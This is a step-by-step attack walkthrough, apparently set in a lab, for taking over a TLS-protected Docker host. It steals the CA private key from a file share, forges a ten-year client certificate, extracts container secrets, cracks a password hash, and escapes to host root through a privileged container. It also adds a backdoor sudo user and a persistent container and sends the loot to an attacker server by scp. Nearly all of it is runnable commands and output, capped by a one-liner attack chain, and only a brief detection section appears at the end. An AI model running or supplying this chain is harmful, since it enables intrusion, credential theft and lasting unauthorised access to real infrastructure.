# Docker TLS Certificate Forgery - Complete Walkthrough

**Objective:** Exploit stolen Docker CA private key to forge client certificates and gain full container infrastructure access.

---

## Prerequisites

```yaml
Attack Scenario:
  - Target: docker-host.lab.internal (10.100.50.30)
  - Docker Daemon: TLS-enabled on port 2376
  - Attacker: kali-workstation (10.100.50.100)
  - Initial Access: low-privileged domain user credentials

Required Materials:
  - ca.pem (Docker CA certificate)
  - ca-key.pem (Docker CA private key) ← CRITICAL
  
Tools Needed:
  - openssl
  - docker client
  - smbclient (for file share access)
```

---

## Phase 1: Discovery & CA Material Theft

### Step 1.1: Enumerate File Shares

```bash
# Scan for SMB shares
crackmapexec smb 10.100.50.0/24 \
  -u lowpriv-user \
  -p 'UserPass123!' \
  --shares

# Expected output shows shares like:
# [+] 10.100.50.20   fileserver-01    Disk   IT-Infrastructure
# [+] 10.100.50.20   fileserver-01    Disk   DevOps-Configs
```

### Step 1.2: Connect to Target Share

```bash
# Connect to file server
smbclient //fileserver-01/DevOps-Configs \
  -U 'LAB/lowpriv-user%UserPass123!'

# Navigate to Docker TLS directory
smb: \> ls
  docker-tls-setup/
  kubernetes-certs/
  ansible-playbooks/

smb: \> cd docker-tls-setup
smb: \> ls
  ca.pem                    # CA certificate
  ca-key.pem               # CA private key ← TARGET
  server-cert.pem          # Docker daemon cert
  server-key.pem           # Docker daemon key
  client-example.pem       # Sample client cert
  setup-notes.txt          # May contain passwords
```

### Step 1.3: Download CA Materials

```bash
# Download required files
smb: \> get ca.pem
getting file \docker-tls-setup\ca.pem of size 1234 bytes

smb: \> get ca-key.pem
getting file \docker-tls-setup\ca-key.pem of size 1675 bytes

smb: \> get setup-notes.txt
getting file \docker-tls-setup\setup-notes.txt of size 512 bytes

smb: \> exit

# Files now in current directory
ls -la
-rw-r--r-- 1 kali kali 1234 Nov 24 21:00 ca.pem
-rw-r--r-- 1 kali kali 1675 Nov 24 21:00 ca-key.pem
-rw-r--r-- 1 kali kali  512 Nov 24 21:00 setup-notes.txt
```

### Step 1.4: Verify CA Certificate

```bash
# Inspect the CA certificate
openssl x509 -in ca.pem -noout -text

# Key information to verify:
# Subject: CN=Docker-TLS-CA, O=Lab Infrastructure
# Validity: Not Before/Not After dates
# CA: TRUE (this is a Certificate Authority)

# Check if key matches certificate
openssl x509 -noout -modulus -in ca.pem | openssl md5
openssl rsa -noout -modulus -in ca-key.pem | openssl md5
# Both MD5 hashes should match
```

---

## Phase 2: Client Certificate Forgery

### Step 2.1: Generate Client Private Key

```bash
# Create 2048-bit RSA private key
openssl genrsa -out docker-client-key.pem 2048

# Output:
# Generating RSA private key, 2048 bit long modulus
# .........+++
# .......................+++
# e is 65537 (0x10001)

# Verify key generation
ls -lh docker-client-key.pem
# -rw------- 1 kali kali 1.7K Nov 24 21:05 docker-client-key.pem
```

### Step 2.2: Create Certificate Signing Request (CSR)

```bash
# Generate CSR with desired identity
openssl req \
  -new \
  -key docker-client-key.pem \
  -out docker-client.csr \
  -subj "/CN=docker-admin/O=Infrastructure-Team/C=US"

# Verify CSR contents
openssl req -in docker-client.csr -noout -text

# Key fields:
# Subject: CN=docker-admin, O=Infrastructure-Team, C=US
# Public Key: RSA 2048 bit
```

### Step 2.3: Sign Certificate with Stolen CA

```bash
# Sign the CSR using compromised CA private key
openssl x509 \
  -req \
  -in docker-client.csr \
  -CA ca.pem \
  -CAkey ca-key.pem \
  -CAcreateserial \
  -out docker-client-cert.pem \
  -days 3650 \
  -sha256

# Expected output:
# Signature ok
# subject=CN = docker-admin, O = Infrastructure-Team, C = US
# Getting CA Private Key

# Verify signed certificate
openssl x509 -in docker-client-cert.pem -noout -text | head -20

# Critical verification points:
# Issuer: Should match CA subject
# Validity: 10 years (3650 days)
# Signature Algorithm: sha256WithRSAEncryption
```

### Step 2.4: Cleanup and Organization

```bash
# Remove CSR (no longer needed)
rm docker-client.csr

# Create organized directory structure
mkdir -p docker-tls-certs
mv ca.pem docker-tls-certs/
mv ca-key.pem docker-tls-certs/
mv docker-client-cert.pem docker-tls-certs/
mv docker-client-key.pem docker-tls-certs/

# Set proper permissions
chmod 600 docker-tls-certs/*.pem
chmod 644 docker-tls-certs/ca.pem
chmod 644 docker-tls-certs/docker-client-cert.pem

# Final file structure
tree docker-tls-certs/
# docker-tls-certs/
# ├── ca.pem                    (644) - CA certificate
# ├── ca-key.pem               (600) - CA private key
# ├── docker-client-cert.pem   (644) - Forged client cert
# └── docker-client-key.pem    (600) - Client private key
```

---

## Phase 3: Docker Authentication

### Step 3.1: Test Docker Daemon Connectivity

```bash
# Verify Docker daemon is listening
nmap -p 2376 10.100.50.30

# Expected:
# PORT     STATE SERVICE
# 2376/tcp open  docker-s

# Test TLS handshake (should fail without certs)
curl -k https://10.100.50.30:2376/version
# Error: certificate required
```

### Step 3.2: Authenticate with Forged Certificate (Method 1)

```bash
# Direct command-line authentication
docker \
  --tlsverify \
  --tlscacert=docker-tls-certs/ca.pem \
  --tlscert=docker-tls-certs/docker-client-cert.pem \
  --tlskey=docker-tls-certs/docker-client-key.pem \
  -H tcp://10.100.50.30:2376 \
  ps -a

# Successful output shows containers:
# CONTAINER ID   IMAGE           COMMAND       STATUS
# a1b2c3d4e5f6   nginx:alpine    "nginx"       Up 3 days
# b2c3d4e5f6a7   postgres:14     "postgres"    Up 3 days
# c3d4e5f6a7b8   app-pwm:latest  "/start.sh"   Up 3 days
```

### Step 3.3: Configure Environment Variables (Method 2 - Cleaner)

```bash
# Set Docker environment variables
export DOCKER_TLS_VERIFY=1
export DOCKER_HOST=tcp://10.100.50.30:2376
export DOCKER_CERT_PATH=$(pwd)/docker-tls-certs

# Verify environment
echo $DOCKER_HOST
# tcp://10.100.50.30:2376

# Now use Docker commands normally
docker ps
docker images
docker info

# Test with specific command
docker version

# Expected output shows:
# Client: Docker Engine - Community
#  Version:           24.0.7
# Server: Docker Engine - Community
#  Version:           24.0.7
#  API version:       1.43
```

### Step 3.4: Enumerate Container Infrastructure

```bash
# List all containers (running and stopped)
docker ps -a --format "table {{.ID}}\t{{.Names}}\t{{.Image}}\t{{.Status}}"

# List images
docker images --format "table {{.Repository}}\t{{.Tag}}\t{{.Size}}"

# List volumes
docker volume ls

# List networks
docker network ls

# Get detailed system information
docker info | grep -A 10 "Server Version"
```

---

## Phase 4: Container Configuration Extraction

### Step 4.1: Identify Target Container

```bash
# Get detailed container list
docker ps -a

# Example target: Password manager container
# CONTAINER ID: c3d4e5f6a7b8
# NAME: password-manager-prod
# IMAGE: pwm:latest

# Inspect container details
docker inspect c3d4e5f6a7b8 | jq '.[0] | {
  Name: .Name,
  Image: .Config.Image,
  Mounts: .Mounts,
  Env: .Config.Env
}'
```

### Step 4.2: Extract Configuration Files

```bash
# Create extraction directory
mkdir -p container-exfil/password-manager-prod

# Extract main configuration directory
docker cp c3d4e5f6a7b8:/config \
  ./container-exfil/password-manager-prod/

# Expected output:
# Successfully copied 15.4MB to ./container-exfil/password-manager-prod/

# Verify extraction
ls -la container-exfil/password-manager-prod/config/
# drwxr-xr-x 2 kali kali 4096 Nov 24 21:10 backup
# -rw-r--r-- 1 kali kali 8192 Nov 24 21:10 PwmConfiguration.xml
# drwxr-xr-x 2 kali kali 4096 Nov 24 21:10 logs
```

### Step 4.3: Extract Additional Directories

```bash
# Extract /etc directory
docker cp c3d4e5f6a7b8:/etc \
  ./container-exfil/password-manager-prod/etc/

# Extract logs
docker cp c3d4e5f6a7b8:/var/log \
  ./container-exfil/password-manager-prod/logs/

# Extract application directory
docker cp c3d4e5f6a7b8:/app \
  ./container-exfil/password-manager-prod/app/
```

### Step 4.4: Extract Container Metadata

```bash
# Full container inspection
docker inspect c3d4e5f6a7b8 > \
  ./container-exfil/password-manager-prod/container-inspect.json

# Extract environment variables
docker inspect c3d4e5f6a7b8 | \
  jq -r '.[0].Config.Env[]' > \
  ./container-exfil/password-manager-prod/environment-variables.txt

# View environment variables
cat ./container-exfil/password-manager-prod/environment-variables.txt

# Example output:
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# DB_HOST=postgres-db.internal
# DB_PORT=5432
# DB_NAME=pwm_database
# DB_USER=pwm_admin
# DB_PASSWORD=DatabaseSecure2024!
# LDAP_URL=ldap://dc-01.lab.internal:389
# LDAP_BIND_DN=CN=svc_pwm,OU=Service Accounts,DC=lab,DC=internal
# LDAP_BIND_PASSWORD=ServiceAccount2024!
```

---

## Phase 5: Credential Extraction & Analysis

### Step 5.1: Search for Sensitive Data

```bash
# Comprehensive credential search
grep -r -i \
  "password\|secret\|token\|apikey\|credential\|api_key\|private_key" \
  ./container-exfil/password-manager-prod/ \
  --include="*.xml" \
  --include="*.properties" \
  --include="*.json" \
  --include="*.yml" \
  --include="*.yaml" \
  --include="*.conf" \
  --include="*.config" \
  --include="*.ini" \
  --color=always | tee credentials-found.txt

# Count matches
wc -l credentials-found.txt
# 47 credentials-found.txt
```

### Step 5.2: Analyze Configuration Backup

```bash
# Target file with sensitive data
cat ./container-exfil/password-manager-prod/config/backup/PwmConfiguration.xml-backup

# Extract password hash
grep -A 1 "configPasswordHash" \
  ./container-exfil/password-manager-prod/config/backup/PwmConfiguration.xml-backup

# Output:
# <property key="configPasswordHash">
#   $2y$04$W1TubX/asdfasdfasdfasdfasdfasdfasdf/8pXbcul0NgA6ZexGyG
# </property>

# Extract LDAP credentials
grep -A 1 "ldap.*assword" \
  ./container-exfil/password-manager-prod/config/backup/PwmConfiguration.xml-backup

# Output:
# <property key="ldapPassword">ServiceAccount2024!</property>

# Extract database credentials
grep -A 1 "db.*assword" \
  ./container-exfil/password-manager-prod/config/backup/PwmConfiguration.xml-backup

# Output:
# <property key="dbPassword">DatabaseSecure2024!</property>
```

### Step 5.3: Extract All Password Hashes

```bash
# BCrypt hashes ($2a$, $2b$, $2y$)
grep -rE '\$2[aby]\$[0-9]{2}\$[./A-Za-z0-9]{53}' \
  ./container-exfil/password-manager-prod/ > bcrypt-hashes.txt

# NTLM hashes (32 hex characters)
grep -rEo '[a-fA-F0-9]{32}' \
  ./container-exfil/password-manager-prod/ > potential-ntlm-hashes.txt

# SHA-256/512 hashes
grep -rE '\$[156]\$[a-zA-Z0-9$./]+' \
  ./container-exfil/password-manager-prod/ > sha-hashes.txt

# Display findings
echo "[+] BCrypt hashes found: $(wc -l < bcrypt-hashes.txt)"
echo "[+] Potential NTLM hashes: $(wc -l < potential-ntlm-hashes.txt)"
echo "[+] SHA hashes found: $(wc -l < sha-hashes.txt)"
```

---

## Phase 6: Password Cracking

### Step 6.1: Identify Hash Type

```bash
# Examine the BCrypt hash
cat bcrypt-hashes.txt

# Hash format: $2y$04$W1TubX/asdfasdfasdfasdfasdfasdf/8pXbcul0NgA6ZexGyG
# 
# Format breakdown:
# $2y$        - BCrypt algorithm identifier
# 04$         - Cost factor (2^4 = 16 rounds) ← VERY WEAK
# W1TubX...   - Salt (22 characters)
# ...         - Hash (31 characters)

# Verify hash format
hashcat --example-hashes | grep -A 5 "bcrypt"
# Mode: 3200
# Hash: $2a$05$asdfasdfasdfasdfasdfasdfasdf.Kj0jZ0pEmm134uzrQlFvQJLF6
```

### Step 6.2: Crack with Hashcat

```bash
# Prepare hash file
echo '$2y$04$W1TubX/asfasdfasdfasdfasdfasdf/8pXbcul0NgA6ZexGyG' > yo-hash.txt

# Crack with Hashcat (mode 3200 = bcrypt)
hashcat \
  -m 3200 \
  -a 0 \
  pwm-hash.txt \
  /usr/share/wordlists/rockyou.txt \
  --force \
  --status \
  --status-timer=10

# Expected output (cost 04 is very weak):
# Session..........: hashcat
# Status...........: Cracked
# Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
# Time.Started.....: Sun Nov 24 21:30:15 2024
# Time.Estimated...: Sun Nov 24 21:32:48 2024 (2 mins, 33 secs)
# Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
# Recovered........: 1/1 (100.00%) Digests

# Show cracked password
hashcat -m 3200 pwm-hash.txt --show

# Output:
# $2y$04$W1TubX/asdfsdfasdfasdfasdf/8pXbcul0NgA6ZexGyG:admin123
```

### Step 6.3: Alternative - John the Ripper

```bash
# Crack with John
john --format=bcrypt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  pwm-hash.txt

# Show cracked password
john --show pwm-hash.txt

# Output:
# ?:admin123
# 1 password hash cracked, 0 left
```

---

## Phase 7: Advanced Exploitation

### Step 7.1: Container Escape (Privileged Container)

```bash
# Create privileged container with host filesystem access
docker run -it \
  --rm \
  --privileged \
  --pid=host \
  --net=host \
  --volume /:/host \
  alpine:latest \
  chroot /host /bin/bash

# You now have root shell on docker-host.lab.internal

# Verify host access
hostname
# docker-host.lab.internal

whoami
# root

cat /etc/shadow | head -3
# root:$6$randomhash...:19000:0:99999:7:::
# daemon:*:19000:0:99999:7:::
# bin:*:19000:0:99999:7:::
```

### Step 7.2: Extract Host SSH Keys

```bash
# From privileged container
ls -la /root/.ssh/
# -rw------- 1 root root 1876 Sep 15 10:23 id_rsa
# -rw-r--r-- 1 root root  398 Sep 15 10:23 id_rsa.pub
# -rw-r--r-- 1 root root  444 Nov 20 14:52 authorized_keys

# Copy SSH private key
cat /root/.ssh/id_rsa

# -----BEGIN OPENSSH PRIVATE KEY-----
# b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
# [... base64 content ...]
# -----END OPENSSH PRIVATE KEY-----

# Exit container and save key on attacker machine
exit

# Save to file
cat > docker-host-root-key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[paste key content here]
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 docker-host-root-key
```

### Step 7.3: Establish Persistent Access

```bash
# SSH to docker host as root
ssh -i docker-host-root-key root@10.100.50.30

# Create backdoor user
useradd -m -s /bin/bash -G sudo backdoor-admin
echo 'backdoor-admin:BackdoorPass2024!' | chpasswd

# Add SSH key for persistence
mkdir -p /home/backdoor-admin/.ssh
cat > /home/backdoor-admin/.ssh/authorized_keys << 'EOF'
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC... attacker-key
EOF

chown -R backdoor-admin:backdoor-admin /home/backdoor-admin/.ssh
chmod 700 /home/backdoor-admin/.ssh
chmod 600 /home/backdoor-admin/.ssh/authorized_keys
```

### Step 7.4: Extract All Container Secrets

```bash
# Enumerate all running containers
docker ps --format "{{.ID}}\t{{.Names}}"

# For each container, extract secrets
for container in $(docker ps -q); do
    container_name=$(docker inspect $container | jq -r '.[0].Name' | sed 's/\///')
    
    echo "[*] Extracting from: $container_name"
    
    # Extract environment variables
    docker inspect $container | jq -r '.[0].Config.Env[]' \
      > ./secrets-${container_name}.txt
    
    # Extract mounted secrets
    docker exec $container ls -la /run/secrets/ 2>/dev/null
    docker exec $container cat /run/secrets/* 2>/dev/null \
      >> ./secrets-${container_name}.txt
    
    echo "[+] Saved to: ./secrets-${container_name}.txt"
done

# Review all extracted secrets
grep -h "PASSWORD\|SECRET\|TOKEN\|KEY" ./secrets-*.txt | sort -u
```

---

## Phase 8: Cleanup & Persistence

### Step 8.1: Organized Exfiltration

```bash
# Create timestamped archive
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
ARCHIVE_NAME="docker-compromise-${TIMESTAMP}.tar.gz"

# Archive all extracted data
tar -czf $ARCHIVE_NAME \
  docker-tls-certs/ \
  container-exfil/ \
  credentials-found.txt \
  bcrypt-hashes.txt \
  secrets-*.txt

# Verify archive
tar -tzf $ARCHIVE_NAME | head -20

# Transfer to secure location
scp $ARCHIVE_NAME attacker-server:/secure-storage/

# Securely delete local files
shred -vfz -n 3 docker-tls-certs/ca-key.pem
rm -rf docker-tls-certs/ container-exfil/
```

### Step 8.2: Maintain Persistent Access

```bash
# Method 1: Forged certificates (valid for 10 years)
# Store certificates in secure offline location
# Use periodically to avoid detection

# Method 2: SSH backdoor on docker host
# Created in Phase 7.3

# Method 3: Backdoor container
docker run -d \
  --name system-monitor \
  --restart always \
  --network host \
  -v /:/host \
  alpine:latest \
  sleep infinity

# Access backdoor container anytime
docker exec -it system-monitor sh
```

---

## Troubleshooting Guide

### Issue: "certificate required" Error

```bash
# Verify certificates are in correct location
ls -la docker-tls-certs/
# Should show: ca.pem, docker-client-cert.pem, docker-client-key.pem

# Check environment variables
echo $DOCKER_TLS_VERIFY    # Should be: 1
echo $DOCKER_HOST          # Should be: tcp://10.100.50.30:2376
echo $DOCKER_CERT_PATH     # Should be: /path/to/docker-tls-certs

# Verify certificate matches CA
openssl verify -CAfile docker-tls-certs/ca.pem \
  docker-tls-certs/docker-client-cert.pem
# Should output: docker-client-cert.pem: OK
```

### Issue: "connection refused"

```bash
# Check Docker daemon is listening
nmap -p 2376 10.100.50.30

# Test with curl
curl -k --cert docker-tls-certs/docker-client-cert.pem \
  --key docker-tls-certs/docker-client-key.pem \
  --cacert docker-tls-certs/ca.pem \
  https://10.100.50.30:2376/version

# Check firewall rules
# May need VPN or be on internal network
```

### Issue: "permission denied" on Container Copy

```bash
# Some files may not be readable
# Use privileged container to access:

docker run --rm -it \
  --privileged \
  --pid=container:c3d4e5f6a7b8 \
  --net=container:c3d4e5f6a7b8 \
  --volumes-from c3d4e5f6a7b8 \
  alpine:latest \
  sh

# Then manually copy files
```

---

## Detection Indicators

### What Gets Logged

```bash
# Docker daemon logs on target
journalctl -u docker -f | grep "TLS"
# Shows: TLS handshakes, certificate subjects

# Audit logs (if enabled)
cat /var/log/docker-audit.log
# Shows: API calls, container operations

# Network connections
netstat -tnp | grep :2376
# Shows: Active TLS connections to Docker daemon
```

### How to Detect This Attack

1. **Monitor CA key file access**
   ```bash
   auditctl -w /etc/docker/ca-key.pem -p r -k docker_ca_key_access
   ```

2. **Track certificate serial numbers**
   ```bash
   # Baseline legitimate certificates
   # Alert on new/unknown serials
   ```

3. **Network anomaly detection**
   ```bash
   # Alert on Docker API access from unusual IPs
   ```

4. **Unusual container operations**
   ```bash
   # Monitor for privileged container creation
   # Track excessive file copy operations
   ```

---

## Quick Reference Card

```bash
# === CERTIFICATE FORGERY ===
openssl genrsa -out docker-client-key.pem 2048
openssl req -new -key docker-client-key.pem -out docker-client.csr \
  -subj "/CN=docker-admin"
openssl x509 -req -in docker-client.csr -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial -out docker-client-cert.pem -days 3650 -sha256

# === DOCKER ACCESS ===
export DOCKER_TLS_VERIFY=1
export DOCKER_HOST=tcp://TARGET:2376
export DOCKER_CERT_PATH=/path/to/certs
docker ps

# === EXTRACTION ===
docker cp CONTAINER_ID:/config ./extracted/
grep -r "password\|secret" ./extracted/

# === CONTAINER ESCAPE ===
docker run -it --privileged --pid=host -v /:/host alpine chroot /host sh
```

---

## One-Liner Full Attack Chain

```bash
# Complete attack in one command (assuming CA materials in current directory)
openssl genrsa -out key.pem 2048 && \
openssl req -new -key key.pem -out csr.pem -subj "/CN=admin" && \
openssl x509 -req -in csr.pem -CA ca.pem -CAkey ca-key.pem \
  -CAcreateserial -out cert.pem -days 3650 -sha256 && \
export DOCKER_TLS_VERIFY=1 DOCKER_HOST=tcp://10.100.50.30:2376 \
  DOCKER_CERT_PATH=$(pwd) && \
docker ps && \
docker cp $(docker ps -q | head -1):/config ./extracted && \
grep -r "password" ./extracted/
```

---

## Summary

**What We Did:**
1. Found Docker CA private key on file share
2. Forged legitimate client certificate (valid 10 years)
3. Authenticated to Docker daemon over TLS
4. Extracted container configurations
5. Found and cracked BCrypt password hash
6. Gained root access via privileged container
7. Established persistent backdoor access

**Impact:**
- Complete container infrastructure compromise
- Access to all application secrets/credentials
- Root access on Docker host
- Persistent access (10-year valid certificates)

**Detection Difficulty:** High  
**Attack Duration:** 30-60 minutes  
**Required Skill Level:** Intermediate

---

